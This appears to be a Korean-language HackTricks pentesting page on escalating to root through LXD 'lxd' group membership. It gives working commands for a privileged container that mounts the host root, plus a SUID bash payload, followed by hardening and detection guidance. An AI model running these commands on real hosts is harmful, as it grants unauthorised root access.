# lxd/lxc 그룹 - 권한 상승

{{#include ../../../banners/hacktricks-training.md}}

호스트의 LXD 관리 그룹(일반적으로 _**lxd**_)에 속하면 데몬을 완전히 제어할 수 있어 root 권한을 얻는 경로가 될 수 있습니다.<sup>[[1]](#references)</sup> 이는 [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) 및 [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md)에 대해 설명한 것과 동일한 신뢰 경계 문제입니다. 현재 프로세스가 이미 컨테이너 내부에 있지 않더라도 관리 API에 접근할 수 있으면 충분할 수 있습니다.<sup>[[1]](#references)</sup>

## Ubuntu `lxd-installer` 소켓 활성화

LXD snap이 없다는 이유만으로 `lxd` 그룹 소속이 무해하다고 가정하지 마세요. Ubuntu Server 24.04 이상에서는 기본 설치되는 `lxd-installer` 패키지가 `/run/lxd-installer.socket`을 `root:lxd` 소유자 및 `0660` 모드로 제공합니다. 연결하면 root 권한으로 `lxd-installer@.service`가 활성화되어 sudo 비밀번호나 polkit 인증 없이 LXD snap을 설치합니다. 일부 wrapper 버전은 표준 입력이 TTY가 아닐 때 확인 프롬프트도 생략합니다.<sup>[[10]](#references)[[11]](#references)</sup>

계정 그룹 소속과 소켓 활성화 서비스를 모두 확인하세요.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

승인된 `lxd` 그룹 테스트는 일반 `lxc` 래퍼를 사용하거나 소켓에 직접 연결해 설치 프로그램을 활성화할 수 있습니다. 후자의 방식은 실제 권한 경계가 래퍼 프롬프트가 아니라 Unix 소켓 ACL임을 보여 줍니다:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

데몬을 사용할 수 있게 되면 아래의 privileged-container 기법을 계속 진행합니다.<sup>[[10]](#references)[[11]](#references)</sup>

## 인터넷 없이 익스플로잇하기

### 방법 1

신뢰할 수 있는 저장소에서 LXD에 사용할 Alpine 이미지를 다운로드할 수 있습니다.
Canonical의 LXD 이미지 서버에서는 매일 빌드를 게시합니다: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
최신 빌드(디렉터리 이름은 날짜입니다)에서 **lxd.tar.xz**와 **rootfs.squashfs**를 모두 받으면 됩니다.<sup>[[8]](#references)</sup>

또는 [프로젝트 안내](https://github.com/lxc/distrobuilder)에 따라 컴퓨터에 distrobuilder를 설치할 수 있습니다.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

**incus.tar.xz** (Canonical 이미지 서버에서 다운로드한 경우 **lxd.tar.xz**)와 **rootfs.squashfs**를 업로드한 다음, 이미지를 가져와 컨테이너를 생성합니다.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> 다음 오류가 표시되면 _**오류: 스토리지 풀이 없습니다. 새 스토리지 풀을 생성하세요**_\
> **`lxd init`**을 실행해 기본 스토리지 풀을 설정한 다음, 이전 명령을 **다시 실행**하세요.<sup>[[2]](#references)</sup>

마지막으로 컨테이너를 시작하고 호스트 파일 시스템에서 root 셸을 여세요:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

이 privileged instance에서는 UID 0이 remap되지 않으므로, 마운트된 host root를 통해 호스트 소유의 SUID payload를 생성할 수 있습니다. 따라서 operator가 container shell에 남는 대신 container-to-host pivot을 완료합니다:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

payload를 SUID를 지원하는 파일시스템에 둡니다. 별도의 `/tmp`는 흔히 `nosuid`로 마운트되며, 호스트 `/`를 비재귀적으로 bind했을 때 그 아래에 포함되지 않을 수 있으므로, 호스트 루트 파일시스템의 `/rootbash` 같은 경로가 이 증명에 더 안정적입니다.<sup>[[10]](#references)[[11]](#references)</sup>

### 방법 2

Alpine 이미지를 빌드하고 `security.privileged=true` 플래그를 사용해 실행합니다. 이렇게 하면 컨테이너의 root가 호스트 root로 매핑되며, `/`를 마운트하면 컨테이너 내부에서 호스트 파일시스템에 접근할 수 있습니다.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## 호스트 전체에 영향을 미치는 AppArmor 부작용

LXD snap을 시작하면 `/run/sysctl.d/zz-lxd.conf`가 생성되고 `kernel.apparmor_restrict_unprivileged_userns`와 `kernel.apparmor_restrict_unprivileged_unconfined`가 모두 `0`으로 설정될 수 있습니다. 이렇게 되면 모든 로컬 사용자를 대상으로 Ubuntu의 비특권 사용자 네임스페이스 제한이 약화되므로, 호스트를 평가할 때 LXD를 활성화하기 전과 후의 값을 기록하세요.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## 감사 및 강화

`lxd` 그룹 멤버십은 root 권한 부여로 취급하세요. 불필요한 멤버를 제거하면 새 로그인 세션부터 적용됩니다. `lxd-installer`를 제거하거나 해당 소켓을 마스킹하면 필요 시 설치되는 경로만 제거되며, 이미 설치된 LXD 데몬에 접근할 수 있는 사용자의 권한은 **제한되지 않습니다**.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

유용한 침해 지표로는 `security.privileged=true`인 LXD 인스턴스, `source`가 `/`인 디스크 장치, `/run/lxd-installer.socket`에 대한 예상치 못한 연결, 새로운 SUID 파일, 그리고 위의 AppArmor sysctl 값이 `1`에서 `0`으로 변경되는 것이 있습니다.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [LXD 보안을 강화하는 방법](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD 컨테이너 및 가상 머신](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [이미지를 복사하고 가져오는 방법](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [distrobuilder로 이미지를 빌드하는 방법](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine 이미지 정의](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder 빌드 스크립트](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD 이미지 서버](https://images.lxd.canonical.com/)
- [9] [유형: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [STAR Labs의 LXD 그룹 권한 상승 보고서 및 PoC](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [새 병에 담긴 오래된 와인: 10년 묵은 LXD 그룹 root 권한, 다시 무장하다](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
